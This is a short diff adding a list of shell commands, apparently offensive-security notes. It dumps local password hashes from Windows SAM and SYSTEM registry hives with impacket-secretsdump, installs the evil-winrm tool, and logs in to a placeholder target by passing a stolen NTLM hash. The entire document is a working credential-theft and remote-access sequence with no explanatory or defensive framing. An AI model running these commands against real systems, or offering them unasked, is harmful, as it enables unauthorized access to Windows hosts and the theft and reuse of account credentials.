@@ -1,0 +1,9 @@
+cd /mnt/c/Temp
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
+sudo apt update
+sudo apt install -y ruby ruby-dev build-essential
+sudo gem install evil-winrm
+evil-winrm --version
+
+evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>
